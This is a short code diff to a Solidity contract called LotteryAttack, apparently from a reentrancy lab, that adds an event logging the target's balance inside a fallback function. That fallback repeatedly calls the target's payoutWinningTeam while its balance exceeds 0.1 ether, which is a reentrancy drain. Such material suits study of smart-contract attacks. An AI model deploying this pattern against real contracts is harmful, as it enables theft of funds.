@@ -4,6 +4,8 @@ import "./Lottery.sol";
 contract LotteryAttack {
     Lottery public lotteryContract;
 
+    event LogFallbackHit(uint256 balance);
+
     constructor(address payable _reentrancyContractAddress) public {
         lotteryContract = Lottery(_reentrancyContractAddress);
     }
@@ -19,7 +21,10 @@ contract LotteryAttack {
     }
 
     fallback() external payable {
-        if (address(lotteryContract).balance > 0.1 ether) {
+        uint bal = address(lotteryContract).balance;
+        emit LogFallbackHit(bal);
+        
+        if (bal > 0.1 ether) {
             lotteryContract.payoutWinningTeam();
         }
     }
